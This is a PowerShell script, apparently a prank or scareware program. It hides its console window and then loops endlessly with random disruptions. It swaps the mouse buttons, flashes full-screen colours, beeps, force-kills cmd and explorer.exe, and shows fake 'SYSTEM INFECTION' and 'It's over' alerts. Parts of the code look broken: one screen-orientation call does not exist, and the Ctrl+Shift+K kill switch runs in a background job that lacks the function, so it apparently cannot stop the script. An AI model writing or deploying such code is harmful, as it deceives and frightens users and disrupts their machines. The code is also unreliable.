$errorActionPreference = 'SilentlyContinue'

Add-Type -AssemblyName "System.Windows.Forms"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class HiddenWindow {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    public static void Hide() {
        IntPtr hWnd = GetConsoleWindow();
        ShowWindow(hWnd, 0);
    }
}
"@
[HiddenWindow]::Hide()

function Random-ScreenEffects {
    $effects = @(
        { [System.Windows.Forms.SystemSounds]::Beep.Play() },
        { 
            $cmd = "rundll32 user32.dll,SwapMouseButton"
            Invoke-Expression $cmd
        },
        { 
            $cursor = [System.IntPtr]::Zero
            [System.Windows.Forms.Cursor]::Current = [System.Windows.Forms.Cursors]::No
        },
        {
            [System.Windows.Forms.Screen]::LockDisplayOrientation([System.Windows.Forms.ScreenOrientation]::Landscape)
        }
    )
    $randomEffect = $effects | Get-Random
    $randomEffect.Invoke()
}

function FlashScreen {
    $flashColors = @("Red", "Blue", "Green", "Yellow", "Pink")
    $randomColor = $flashColors | Get-Random
    $flashScript = {
        $flashForm = New-Object System.Windows.Forms.Form
        $flashForm.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
        $flashForm.BackColor = [System.Drawing.Color]::$randomColor
        $flashForm.TopMost = $true
        $flashForm.Show()
        Start-Sleep -Seconds 0.5
        $flashForm.Hide()
    }
    Invoke-Command $flashScript
}

function Random-Madness {
    $madnessActions = @(
        { FlashScreen },
        { Random-ScreenEffects },
        { 
            Start-Process "cmd"
            Start-Sleep -Seconds 2
            Get-Process "cmd" | Stop-Process -Force
        },
        { 
            [console]::beep(700, 2000)
            Start-Sleep -Seconds 1
            [console]::beep(1200, 100)
        }
    )
    $madAction = $madnessActions | Get-Random
    $madAction.Invoke()
}

function Trigger-FinalPhase {
    $finalPhaseActions = @(
        { 
            [System.Windows.Forms.MessageBox]::Show("SYSTEM INFECTION: YOU CANNOT ESCAPE.", "ERROR: FULL SYSTEM COMPROMISED", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Critical)
            Start-Sleep -Seconds 1
        },
        { 
            Start-Process "explorer.exe"
            Start-Sleep -Seconds 1
            Get-Process "explorer" | Stop-Process -Force
        },
        {
            [System.Windows.Forms.MessageBox]::Show("This is it. It's over.", "GOODBYE.", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        }
    )
    $randomFinalAction = $finalPhaseActions | Get-Random
    $randomFinalAction.Invoke()
}

function Kill-Switch {
    $key = [System.Windows.Forms.Keys]::Control -bor [System.Windows.Forms.Keys]::Shift -bor [System.Windows.Forms.Keys]::K
    $keyListener = New-Object System.Windows.Forms.Form
    $keyListener.KeyPreview = $true
    $keyListener.Add_KeyDown({
        if ($_.Control -and $_.Shift -and $_.KeyCode -eq [System.Windows.Forms.Keys]::K) {
            $keyListener.Close()
            exit
        }
    })
    $keyListener.ShowDialog()
}

Start-Job { Kill-Switch }

while ($true) {
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
    Random-Madness
    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
    Trigger-FinalPhase
}
